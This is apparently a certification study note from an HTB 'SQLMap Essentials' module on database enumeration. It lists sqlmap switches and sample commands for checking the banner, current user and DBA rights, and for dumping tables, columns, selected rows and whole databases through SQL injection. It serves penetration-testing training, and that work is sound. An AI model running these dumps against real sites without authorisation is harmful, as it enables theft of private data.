---
tags: [CWES, HTB, technical-reference]
module: "SQLMap Essentials"
source_file: "CWES.xmind"
---

# Database Enumeration

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## SQLMap Data Exfiltration

### queries for all supported DBMSes

- for a MySQL DBMS
  - <https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml>
## Basic DB Data Enumeration

### arguments

- Database version banner (switch --banner)
- Current user name (switch --current-user)
- Current database name (switch --current-db)
- Checking if the current user has DBA (administrator) rights (switch --is-dba)
### sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

- web application technology: PHP 5.2.6, Apache 2.2.9
- current user: 'root@%'
- current database: 'testdb'
- current user is DBA: True
## Table Enumeration

### --tables

### -T users  --dump

## Table/Row Enumeration

### -C

- --dump -T users -D testdb -C name,surname
### narrow down the rows based on their ordinal number(s)

- --dump -T users -D testdb --start=2 --stop=3
## Conditional Enumeration

### --dump -T users -D testdb --where="name LIKE 'f%'"

## Full DB Enumeration

### --dump-all

- without specifying a table with -T, all of the current database content will be retrieved.
